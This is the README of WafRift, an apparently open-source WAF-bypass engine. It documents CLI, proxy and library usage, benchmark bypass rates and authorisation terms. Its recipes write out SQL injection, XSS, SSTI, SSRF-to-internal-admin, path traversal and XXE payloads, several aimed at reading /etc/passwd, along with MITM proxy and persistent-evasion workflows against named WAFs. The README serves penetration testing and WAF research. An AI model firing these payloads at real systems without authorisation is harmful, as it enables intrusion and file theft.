# WafRift

[![CI](https://github.com/santhsecurity/wafrift/actions/workflows/ci.yml/badge.svg)](https://github.com/santhsecurity/wafrift/actions/workflows/ci.yml)
[![License: MIT OR Apache-2.0](https://img.shields.io/badge/License-MIT%20OR%20Apache--2.0-blue.svg)](#license)
[![Crates.io](https://img.shields.io/crates/v/wafrift)](https://crates.io/crates/wafrift)

> Part of the [Santh](https://santh.dev) security research ecosystem.

**A programmable WAF-evasion engine with per-technique controls — and an evolutionary mode that learns bypasses for you.**

Other tools give you one trick: junk padding, header injection, smuggling, or a static tamper list. WafRift is the union — encoding, grammar-aware mutation, content-type switching, request smuggling, and TLS/HTTP fingerprint rotation. In v0.1 the **CLI exposes encoding strategies and the grammar layer as fine-grained `--only`/`--exclude` selectors**; the rest run as part of the default pipeline. Per-host toggle persistence and a Burp Suite control panel are tracked in the [post-0.1 roadmap](docs/GAP_CLOSURE_ROADMAP.md). Turn the engine loose and a search loop (hill-climb / SA / tabu / novelty / MAP-Elites) discovers what bypasses the target WAF and persists winning pipelines to a per-WAF **gene bank** so the next scan starts with zero discovery phase.

## Measured bypass rates

Every number below is reproducible from the bench harness in
[`wafrift-bench/`](./wafrift-bench/). Methodology in
[`wafrift-bench/methodology.md`](./wafrift-bench/methodology.md);
machine-readable JSON in `wafrift-bench/results/`.

**Target: ModSecurity + OWASP CRS (the most-deployed open-source WAF).**
Corpus: 557 cases across 10 attack classes (sql / xss / cmdi / ssti /
path / ldap / xxe / ssrf / nosql / log4shell). 10 evasion strategies
combined: payload-string mutation, MCTS (mctrust 0.4), HTTP smuggling,
content-type confusion, ReDoS, hill-climbing, simulated annealing,
tabu, novelty, MAP-Elites. Oracle-gated (each "bypass" verified
structurally as a valid attack, not garbage that slipped past).

| Paranoia | Variants sent | Bypassed | Bypass rate | Cases ≥1 bypass |
|---|---:|---:|---:|---:|
| **PL=1** (default) | 46k | 16.7k | **36%** | **557 / 557 (100%)** |
| PL=2 | 60k | 17.6k | 29% | 557 / 557 (100%) |
| PL=3 | 60k | 17.3k | 28% | 557 / 557 (100%) |
| **PL=4** (most aggressive) | 60k | 16.3k | **27%** | **557 / 557 (100%)** |

**At every paranoia level — including PL=4, the most paranoid CRS
preset — every single attack case in the corpus has at least one
working bypass.** Once a working evasion seed exists, the per-host
gene bank (`~/.wafrift/genomes/`) replays it indefinitely, so
subsequent scans against the same WAF start with zero discovery
phase.

```bash
# Reproduce
git clone https://github.com/santhsecurity/wafrift && cd wafrift
wafrift-bench/scripts/up.sh modsec-pl4
cargo run --release -p wafrift-cli -- bench-waf \
    --base-url http://127.0.0.1:18084 \
    --corpus wafrift-bench/corpus \
    --evade --variants 20 \
    --strategies heavy,mcts,smuggling,content-type,redos,hill-climb,sim-anneal,tabu,novelty,map-elites,differential \
    --oracle-gate \
    --output repro.json
jq .evaded_summary repro.json
```

## Why WafRift?

**Composable, not monolithic.** Encoding strategies and the grammar layer are addressable as hierarchical paths and individually selectable: `--only encoding/url` runs a surgical pipeline; `--exclude encoding/url/triple,grammar` keeps the loud transforms off; default = full pipeline. Run `wafrift techniques list` to see every selector. No other open-source bypass tool exposes this surface — Burp's `nowafpls` does junk padding, `Bypass WAF` does headers, `HTTP Smuggler` does smuggling. WafRift is the union, on knobs.

**Evolutionary, not static.** Most bypass tools apply the same transforms every time. WafRift:

1. **Discovers** which evasion techniques bypass the target WAF
2. **Prunes** techniques that get blocked
3. **Rotates** only proven winners to avoid pattern detection
4. **Adapts** — if the WAF learns to block a winner, WafRift detects the drift and rediscovers

The gene bank (`~/.wafrift/genomes/`) persists learned bypasses across sessions. Scan a Cloudflare site once, and every future Cloudflare scan starts with proven bypasses — **zero discovery phase**.

**Semantically correct.** Grammar mutations are validated against `sqlparser-rs` AST equivalence, so SQL variants actually parse — most tampers ship broken payloads and don't know it.

## Installation

```bash
cargo install --path crates/cli
```

## Quickstart

Pick your workflow — each is copy-paste ready.

### 🏁 CTF — "I have a SQLi but there's a WAF"

```bash
# Get bypass variants instantly (offline — no target needed)
wafrift evade --payload "' OR 1=1--" --level heavy

# Found a WAF? Fire all variants and see what gets through
wafrift scan --target http://ctf.example/vuln --payload "' OR 1=1--"
```

### 🔍 Pentest — "sqlmap/ffuf behind a WAF"

```bash
# Start the evasion proxy
cargo run -p wafrift-proxy -- --listen 127.0.0.1:8080

# Route your tools through it
sqlmap -u "https://target/x?id=1" --proxy="http://127.0.0.1:8080"
ffuf -x http://127.0.0.1:8080 -u https://target/FUZZ -w wordlist.txt

# Check live findings mid-session
curl http://127.0.0.1:8080/_wafrift/findings.md
```

### 🎯 Bug Bounty — "Scan this target, give me a report"

```bash
# Full autonomous scan with JSON output
wafrift scan --target https://target.com --payload "' UNION SELECT 1--" \
  --param id --format json --output results.json

# Generate a markdown writeup from findings
wafrift report --only-host target.com --output writeup.md
```

### 🔴 Red Team — "Persistent evasion against Cloudflare"

```bash
# First scan learns what bypasses Cloudflare and saves to gene bank
wafrift scan --target https://target.com --payload "' OR 1=1--"

# Every future scan against Cloudflare starts with zero discovery phase
# Gene bank at ~/.wafrift/genomes/ persists across sessions

# Replay a specific bypass to prove reproducibility (CI gate: exits 2 if blocked)
wafrift replay --target https://target.com --from-waf Cloudflare --param id
```

## Usage

### Interactive Mode (default)

```bash
wafrift
```

Launches a ratatui-based terminal UI with keyboard navigation. Features:

- **Gene Bank Browser** — view per-WAF genome data, technique success rates, and historical scans
- **Technique Tree** — hierarchical view of all encoding/grammar/smuggling technique paths
- **Guided Command Builder** — step through scan/evade/detect with prompts instead of memorizing flags
- **Status Dashboard** — at-a-glance learning cache size, genome count, and last scan summary

**Keybindings:** `↑/↓` navigate, `Enter` select, `q` quit, `Tab` switch panels.

> **Note:** The TUI is functional but early-stage. For scripted/CI workflows, use the CLI subcommands directly.

### Scan a Target

```bash
# Basic scan
wafrift scan --target http://target.com --payload "' OR 1=1--"

# XSS scan with heavy evasion
wafrift scan --target http://target.com --payload "<script>alert(1)</script>" --level heavy

# JSON output for CI/CD
wafrift scan --target http://target.com --payload "' OR 1=1--" --format json

# JSON with fixed “layer” matrix (network / detection / baseline / evasion)
wafrift scan --target http://target.com --payload "' OR 1=1--" --format json --report-layers

# Egress preset (Tor SOCKS JSON for EvasionConfig)
wafrift egress-example --preset tor

# Custom parameter name
wafrift scan --target http://target.com --payload "' UNION SELECT 1--" --param id
```

### Transform Payloads (offline)

```bash
# Light evasion
wafrift evade --payload "' OR 1=1--" --level light

# Heavy evasion with all techniques
wafrift evade --payload "' OR 1=1--" --level heavy
```

### Fine-Grained Technique Selection

Every encoding strategy and the grammar layer are addressable as hierarchical paths.
List what's available, then include or exclude per scan:

```bash
# See the full tree
wafrift techniques list

# Only URL-family encodings (no grammar, no Unicode, no entities)
wafrift evade --payload "' OR 1=1--" --only encoding/url

# Everything except triple-URL and SQL-comment tampers
wafrift scan --target http://target.com --payload "' OR 1=1--" \
  --exclude encoding/url/triple,encoding/sql/comment

# Compose: only URL family, but skip the noisiest variant
wafrift evade --payload "' OR 1=1--" \
  --only encoding/url --exclude encoding/url/triple
```

Unknown selectors fail fast — no silent drops.

### Detect a WAF

```bash
wafrift detect --status 403 --headers "server: cloudflare" --body "Attention Required!"
```

### Proxy Mode

```bash
# Start evasion proxy on port 8080
wafrift-proxy --listen 127.0.0.1:8080

# Force heavy-level evasion
wafrift-proxy --listen 127.0.0.1:8080 --escalation heavy

# HTTPS MITM (install generated CA in the client first — see docs/PROXY_TOOLING.md)
wafrift-proxy --write-mitm-ca-dir ./mitm-ca
wafrift-proxy --listen 127.0.0.1:8080 --mitm --mitm-ca-dir ./mitm-ca
```

Point your scanner at the proxy — all traffic is automatically transformed to bypass WAF rules. The proxy learns per-host: discovery → rotation → drift detection → re-discovery. With **`--mitm`**, TLS on `CONNECT` is terminated so HTTPS requests go through the same evasion path (authorized targets only).

#### Scope filters (don't break login flows / static assets)

By default the proxy evades **every** request, which is the wrong shape when you've pointed Burp at it and are also browsing the application normally. Scope filters let you keep wafrift active only where you want it; everything else is forwarded verbatim with no evasion, no gene-bank update, no detection.

```bash
# Only evade traffic to *.example.com on JSON API endpoints,
# leave login + static assets untouched.
wafrift-proxy --listen 127.0.0.1:8080 --mitm \
  --only-host '*.example.com' \
  --skip-path '/static/*,/oauth/*,/login,/favicon.ico' \
  --only-method 'POST,PUT,PATCH,DELETE'
```

Patterns use a tiny ASCII glob grammar (`*` matches any run, `?` matches one byte, case-insensitive). `--skip-host`/`--skip-path` are evaluated **after** `--only-host`/`--only-path`.

#### Per-host rate limiting (don't accidentally DoS the target)

```bash
# Token bucket: 5 req/s per upstream host, burst of 10.
wafrift-proxy --listen 127.0.0.1:8080 --mitm \
  --max-rps-per-host 5 --max-rps-per-host-burst 10
```

#### Live findings (curl the proxy mid-session)

```bash
# Loopback-only, peer-loopback gated.
curl http://127.0.0.1:8080/_wafrift/findings.md   # markdown writeup
curl http://127.0.0.1:8080/_wafrift/status        # JSON (schema_version + per-host stats)
```

### End-to-end practitioner walkthrough (5 min)

```bash
# 1. Scaffold a config in the current directory (commented out — pure no-op until you edit).
wafrift init

# 2. Generate the MITM CA (auto-installs in OS trust store on Linux/macOS where possible;
#    falls through to printed instructions on Windows).
wafrift-proxy --write-mitm-ca-dir ~/.wafrift/mitm-ca

# 3. Run the proxy in front of your client (Burp / browser / sqlmap / curl).
wafrift-proxy --listen 127.0.0.1:8080 --mitm \
  --only-host '*.target.tld' \
  --skip-path '/static/*,/healthz' \
  --max-rps-per-host 5 \
  --max-evade-retries 3 \
  --gene-bank-path ~/.wafrift/target.json

# 4. Drive your client normally. Watch findings land in real time:
curl -s http://127.0.0.1:8080/_wafrift/findings.md

# 5. Render a pentest-shaped report from the gene bank.
wafrift report --proxy-bank ~/.wafrift/target.json --output engagement.md

# 6. Reproduce any individual finding deterministically (returns exit 0 = bypass, 2 = blocked).
wafrift replay \
  --target 'https://api.target.tld/search' \
  --param q --payload "1' OR 1=1-- " \
  --from-host 'api.target.tld' --proxy-bank ~/.wafrift/target.json

# 7. Gate regressions in CI: snapshot bench output, compare future runs.
wafrift bench-waf --target modsec-pl4 --strategies all --output current.json
wafrift bench-diff --baseline baseline.json --current current.json --bypass-drop-pp 2
```

#### Authorisation

`wafrift-proxy` refuses upstream targets in private/loopback/RFC1918/link-local ranges by default; pass `--allow-private-upstream` only against lab targets you own. `wafrift replay` and the differential probes send genuinely exploitable strings — only run them against systems you control or have explicit written authorisation to test.

### CTF / pentest quick recipes

Five common shapes a security practitioner runs into. Every recipe is a single command — no setup beyond `cargo install wafrift` (or `docker run santhsecurity/wafrift`) and the `--target`/`--payload` you'd be testing anyway.

**1. SQL-injection login bypass.** WAF blocks `' OR 1=1--`; find a variant that lands.

```bash
wafrift scan --target https://target/login \
  --payload "' OR 1=1--" --param username --level heavy
```

Output prints which evasion technique chain produced the bypass. Replay later with the exact chain saved into the gene-bank — second run skips discovery.

**2. SSTI in a server-side template.** Variant of `{{7*7}}` that the WAF allows but the engine still evaluates.

```bash
wafrift scan --target https://target/profile \
  --payload "{{7*7}}" --param name --level heavy --only grammar/ssti,encoding
```

`--only grammar/ssti,encoding` keeps the search focused — running the full pipeline against a single template reflection is slow.

**3. SSRF to internal admin.** Smuggle a `127.0.0.1:9000` request past a WAF that only blacklists string `127.0.0.1`.

```bash
wafrift scan --target https://target/preview \
  --payload "http://127.0.0.1:9000/admin" --param url --level heavy \
  --only encoding,grammar/ssrf
```

The differential probe set (`wafrift probe`) lists the sub-techniques the WAF reliably blocks for this class — handy when the scan comes back empty and you need to know what NOT to retry.

**4. Path traversal / LFI.** WAF blocks `../`; find a variant that survives.

```bash
wafrift scan --target https://target/static \
  --payload "../../../etc/passwd" --param file --level heavy \
  --only encoding/url,encoding/unicode,grammar/path
```

**5. XXE in an XML body.** Practitioner has the request body in a file; want to scan with that exact body shape.

```bash
# Copy the request as cURL out of Burp/ZAP, paste through import-curl:
pbpaste | wafrift import-curl --from-stdin \
  --param xmlData --payload '<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>' \
  --level heavy
```

**Saving and replaying findings.** Once a recipe lands a bypass, persist it to the gene-bank so subsequent runs (or teammates) don't re-do discovery:

```bash
wafrift seed --waf modsec-crs --technique EncodingDoubleUrl,GrammarTautology
wafrift bank export --output bundle.json    # share with teammate
wafrift bank import bundle.json             # on teammate's machine
```

Replay any saved finding deterministically:

```bash
wafrift replay --target https://target/login --param username \
  --payload "' OR 1=1--" --from-host target  # exits 0 on bypass, 2 on block
```

## Architecture

```
wafrift
├── crates/
│   ├── types          # Core types: Request, Technique, EvasionResult
│   ├── encoding       # 15+ encoding strategies (URL, Unicode, HTML entity, chunked, etc.)
│   ├── grammar        # Grammar-aware payload mutations (SQLi, XSS, CMD, SSTI, SSRF, LDAPi, path traversal)
│   ├── content-type   # Content-Type switching (JSON, XML, multipart, etc.)
│   ├── smuggling      # HTTP request smuggling (CL.TE, TE.CL, H2)
│   ├── fingerprint    # Browser fingerprint rotation (User-Agent, TLS, headers)
│   ├── detect         # WAF fingerprinting (160+ WAFs via TOML rules)
│   ├── evolution      # Genetic algorithm: crossover, mutation, fitness, MCTS, differential probing
│   ├── oracle         # Multi-signal response classification (block / bypass / challenge / rate-limit)
│   ├── strategy       # Pipeline orchestrator + gene bank + learning cache + adaptive host state
│   ├── transport      # Evasion-aware HTTP client with auto-retry
│   ├── proxy          # HTTP forward proxy with per-host adaptive evasion
│   ├── pool           # Proxy pool rotation (round-robin HTTP/SOCKS5)
│   ├── recon          # Origin discovery via OSINT (CT logs, DNS history)
│   └── cli            # Interactive TUI + headless scan/evade/detect/probe commands
```

## As a Library

Import the façade crate for all modules under one dependency, or pull individual crates (see below).

```toml
[dependencies]
wafrift-core = "0.1"
tokio = { version = "1", features = ["rt-multi-thread", "macros"] }
```

```rust
use wafrift_core::encoding::{self, Strategy};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let encoded = encoding::encode(b"' OR 1=1--", Strategy::UnicodeEncode)?;
    println!("{encoded}");
    Ok(())
}
```

The CLI’s live `scan` flow is built from `wafrift-strategy`, `wafrift-transport`, and `wafrift-detect`; embed those crates directly if you need the same pipeline without the binary.

## As Individual Crates

Use exactly the piece you need — no full-engine import required.

```toml
[dependencies]
wafrift-encoding = "0.1"    # 15+ encoding strategies
wafrift-grammar = "0.1"     # SQL/XSS/CMD/SSTI dialect mutations
wafrift-detect = "0.1"      # WAF fingerprinting (160+ WAFs via TOML rules)
wafrift-smuggling = "0.1"   # HTTP request smuggling probes
wafrift-evolution = "0.1"   # Genetic/novelty/MAP-Elites bypass search
wafrift-oracle = "0.1"      # Response verdict classification
wafrift-strategy = "0.1"    # Per-WAF evasion pipeline planning
```

```rust
use wafrift_encoding::{Strategy, encode};

let encoded = encode(b"' OR 1=1--", Strategy::UnicodeEscape)?;
```

## Community Rules (Tier B)

WAF signatures, evasion pipelines, and smuggling probes live as TOML files in `rules/`. Adding a new WAF = 5 lines of TOML, no Rust knowledge:

```toml
# rules/detect/mywaf.toml
name = "MyWAF"
vendor = "Example Corp"
confidence_weight = 0.9

[[headers]]
name = "Server"
pattern = "MyWAF/\\d+"

[[body_patterns]]
pattern = "(?i)blocked by MyWAF"

evasions = ["encoding::unicode", "grammar::tautology_swap"]
```

Drop into `rules/detect/` and the detector loads it at startup.

## Gene Bank

WafRift remembers what works. After every scan, learned techniques are persisted to `~/.wafrift/genomes/<waf_name>.json`:

```json
{
  "waf_name": "Cloudflare",
  "techniques": [
    { "name": "encoding::UnicodeEncode", "total_successes": 13, "total_attempts": 13 },
    { "name": "encoding::HtmlEntityEncode", "total_successes": 13, "total_attempts": 13 },
    { "name": "tautology_swap", "total_successes": 56, "total_attempts": 56 }
  ],
  "targets_scanned": 3
}
```

Next time you scan a Cloudflare site, these techniques load automatically.

## Proxy Feedback Loop

The proxy continuously learns:

```
Request → evade() → forward → observe 200/403
                ↑                       |
                └── feedback loop ──────┘

Discovery → Rotation → Drift Detection → Re-Discovery
```

- **Discovery**: try all techniques, track success/failure rates
- **Rotation**: once ≥60% winners found, only use those (round-robin)
- **Drift**: if a winner gets blocked 2× consecutively, evict it
- **Re-discovery**: if all winners evicted, clean slate and restart

## Evasion Techniques

| Category | Techniques |
|----------|-----------|
| **Encoding** | URL, Double-URL, Triple-URL, Unicode, IIS Unicode, HTML entity, Hex, Base64, UTF-7, Overlong UTF-8, Chunked split, Parameter pollution, Null byte |
| **Grammar** | Tautology swap, keyword-free arithmetic, comment insertion, whitespace variation, keyword casing, string splitting, hex literals, dialect-specific (MySQL/PG/MSSQL/Oracle/SQLite) |
| **Content-Type** | JSON body, XML body, multipart form-data switching |
| **Headers** | Case mixing, header injection, duplicate headers, HPP |
| **Fingerprint** | User-Agent rotation, TLS fingerprint, Accept-Language |
| **Smuggling** | CL.TE, TE.CL, HTTP/2 mixed-case headers, H2 pseudo-header abuse |

## Parity roadmap (proxy, TLS, origin, egress)

See [docs/GAP_CLOSURE_ROADMAP.md](docs/GAP_CLOSURE_ROADMAP.md) for phased work toward EvilWAF-class workflows (HTTPS MITM, JA3 parity, recon). Supporting docs: [docs/PROXY_TOOLING.md](docs/PROXY_TOOLING.md), [docs/TLS_PARITY.md](docs/TLS_PARITY.md).

## License

Licensed under either of

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE) or <http://www.apache.org/licenses/LICENSE-2.0>)
- MIT license ([LICENSE-MIT](LICENSE-MIT) or <https://opensource.org/licenses/MIT>)

at your option.

### Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.

## Lawful Use & Repository Responsibility

wafrift is dual-use security research software. It implements WAF
evasion techniques that, executed against systems you do not own or
have written authorisation to test, may violate computer-misuse law
(CFAA in the United States, Computer Misuse Act in the United Kingdom,
StGB §202c in Germany, equivalent statutes elsewhere). By downloading,
building, or running wafrift you agree:

1. **Authorisation is yours alone.** You will only run wafrift against
   systems you own, operate, or have explicit written authorisation to
   test — bug-bounty scope, signed pentest agreement, CTF rules, or
   lab infrastructure under your control. Verify scope before each
   engagement.
2. **Legal responsibility transfers to the operator.** The Santh
   Security maintainers, contributors, and the project itself accept
   no liability for traffic generated by, damages caused by, or legal
   exposure resulting from your use of the tool.
3. **Unauthorised use is out of scope of any support.** We will not
   help users bypass WAFs protecting systems they have no authorisation
   to interact with. Reports of misuse may be forwarded to the affected
   organisation's `abuse@` / legal channels.

Full clause and reporting workflow in [`SECURITY.md`](./SECURITY.md#lawful-use--repository-responsibility) and [`CODE_OF_CONDUCT.md`](./CODE_OF_CONDUCT.md#lawful-use--repository-responsibility).
